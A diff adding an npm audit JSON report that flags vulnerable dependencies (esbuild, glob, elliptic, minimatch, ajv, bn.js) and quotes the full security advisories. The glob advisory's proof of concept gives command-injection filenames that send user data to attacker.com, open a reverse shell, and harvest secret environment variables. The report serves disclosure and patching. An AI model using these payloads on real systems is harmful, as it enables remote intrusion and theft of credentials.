@@ -1,0 +1,573 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1113398,
+          "path": ".>@storybook/nextjs>@storybook/builder-webpack5>fork-ts-checker-webpack-plugin>schema-utils>ajv",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "ajv",
+      "target": "6.14.0",
+      "depth": 6
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1113402,
+          "path": ".>@storybook/nextjs>node-polyfill-webpack-plugin>crypto-browserify>browserify-sign>bn.js",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "bn.js",
+      "target": "5.2.3",
+      "depth": 6
+    },
+    {
+      "action": "review",
+      "module": "esbuild",
+      "resolves": [
+        {
+          "id": 1102341,
+          "path": ".>vitest>vite>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "glob",
+      "resolves": [
+        {
+          "id": 1109842,
+          "path": ".>eslint-config-next>@next/eslint-plugin-next>glob",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "elliptic",
+      "resolves": [
+        {
+          "id": 1112030,
+          "path": ".>@storybook/nextjs>node-polyfill-webpack-plugin>crypto-browserify>browserify-sign>elliptic",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "minimatch",
+      "resolves": [
+        {
+          "id": 1113371,
+          "path": ".>@storybook/nextjs>@storybook/builder-webpack5>fork-ts-checker-webpack-plugin>minimatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113371,
+          "path": ".>@typescript-eslint/eslint-plugin>@typescript-eslint/type-utils>@typescript-eslint/typescript-estree>minimatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113371,
+          "path": ".>resend>@react-email/render>js-beautify>editorconfig>minimatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "bn.js",
+      "resolves": [
+        {
+          "id": 1113402,
+          "path": ".>@storybook/nextjs>node-polyfill-webpack-plugin>crypto-browserify>browserify-sign>elliptic>bn.js",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1102341": {
+      "findings": [
+        {
+          "version": "0.21.5",
+          "paths": [
+            ". > @vitest/coverage-v8@1.6.1 > vitest@1.6.1 > vite@5.4.21 > esbuild@0.21.5",
+            ". > @vitest/coverage-v8@1.6.1 > vitest@1.6.1 > vite-node@1.6.1 > vite@5.4.21 > esbuild@0.21.5",
+            ". > @vitest/ui@1.6.1 > vitest@1.6.1 > vite@5.4.21 > esbuild@0.21.5",
+            ". > @vitest/ui@1.6.1 > vitest@1.6.1 > vite-node@1.6.1 > vite@5.4.21 > esbuild@0.21.5",
+            ". > vitest@1.6.1 > vite@5.4.21 > esbuild@0.21.5",
+            ". > vitest@1.6.1 > vite-node@1.6.1 > vite@5.4.21 > esbuild@0.21.5"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99\n- https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d\n- https://github.com/advisories/GHSA-67mh-4wv8-2f99",
+      "created": "2025-02-10T17:48:07.000Z",
+      "id": 1102341,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
+      "reported_by": null,
+      "title": "esbuild enables any website to send any requests to the development server and read the response",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "esbuild",
+      "vulnerable_versions": "<=0.24.2",
+      "github_advisory_id": "GHSA-67mh-4wv8-2f99",
+      "recommendation": "Upgrade to version 0.25.0 or later",
+      "patched_versions": ">=0.25.0",
+      "updated": "2025-02-10T17:48:08.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-346"
+      ],
+      "url": "https://github.com/advisories/GHSA-67mh-4wv8-2f99"
+    },
+    "1109842": {
+      "findings": [
+        {
+          "version": "10.3.10",
+          "paths": [
+            ". > eslint-config-next@14.2.35 > @next/eslint-plugin-next@14.2.35 > glob@10.3.10"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2\n- https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64756\n- https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f\n- https://github.com/advisories/GHSA-5j98-mcp5-4vw2",
+      "created": "2025-11-17T17:38:56.000Z",
+      "id": 1109842,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",
+      "reported_by": null,
+      "title": "glob CLI: Command injection via -c/--cmd executes matches with shell:true",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-64756"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "glob",
+      "vulnerable_versions": ">=10.2.0 <10.5.0",
+      "github_advisory_id": "GHSA-5j98-mcp5-4vw2",
+      "recommendation": "Upgrade to version 10.5.0 or later",
+      "patched_versions": ">=10.5.0",
+      "updated": "2025-11-19T02:30:53.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-78"
+      ],
+      "url": "https://github.com/advisories/GHSA-5j98-mcp5-4vw2"
+    },
+    "1112030": {
+      "findings": [
+        {
+          "version": "6.6.1",
+          "paths": [
+            ". > @storybook/nextjs@8.6.15 > node-polyfill-webpack-plugin@2.0.1 > crypto-browserify@3.12.1 > browserify-sign@4.2.5 > elliptic@6.6.1",
+            ". > @storybook/nextjs@8.6.15 > node-polyfill-webpack-plugin@2.0.1 > crypto-browserify@3.12.1 > create-ecdh@4.0.4 > elliptic@6.6.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-14505\n- https://github.com/indutny/elliptic/issues/321\n- https://www.herodevs.com/vulnerability-directory/cve-2025-14505\n- https://github.com/advisories/GHSA-848j-6mx2-7j84",
+      "created": "2026-01-08T21:30:34.000Z",
+      "id": 1112030,
+      "npm_advisory_id": null,
+      "overview": "The ECDSA implementation of the Elliptic package generates incorrect signatures if an interim value of 'k' (as computed based on step 3.2 of  RFC 6979 https://datatracker.ietf.org/doc/html/rfc6979 ) has leading zeros and is susceptible to cryptanalysis, which can lead to secret key exposure. This happens, because the byte-length of 'k' is incorrectly computed, resulting in its getting truncated during the computation. Legitimate transactions or communications will be broken as a result. Furthermore, due to the nature of the fault, attackers could–under certain conditions–derive the secret key, if they could get their hands on both a faulty signature generated by a vulnerable version of Elliptic and a correct signature for the same inputs.\n\nThis issue affects all known versions of Elliptic (at the time of writing, versions less than or equal to 6.6.1).",
+      "reported_by": null,
+      "title": "Elliptic Uses a Cryptographic Primitive with a Risky Implementation",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-14505"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "elliptic",
+      "vulnerable_versions": "<=6.6.1",
+      "github_advisory_id": "GHSA-848j-6mx2-7j84",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-01-09T20:19:43.000Z",
+      "cvss": {
+        "score": 5.6,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-1240"
+      ],
+      "url": "https://github.com/advisories/GHSA-848j-6mx2-7j84"
+    },
+    "1113371": {
+      "findings": [
+        {
+          "version": "3.1.2",
+          "paths": [
+            ". > @storybook/nextjs@8.6.15 > @storybook/builder-webpack5@8.6.15 > fork-ts-checker-webpack-plugin@8.0.0 > minimatch@3.1.2",
+            ". > @storybook/nextjs@8.6.15 > @storybook/preset-react-webpack@8.6.15 > @storybook/react-docgen-typescript-plugin@1.0.6--canary.9.0c3f3b7.0 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > @vitest/coverage-v8@1.6.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.2",
+            ". > @vitest/coverage-v8@1.6.1 > test-exclude@6.0.0 > minimatch@3.1.2",
+            ". > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > eslint@8.57.1 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
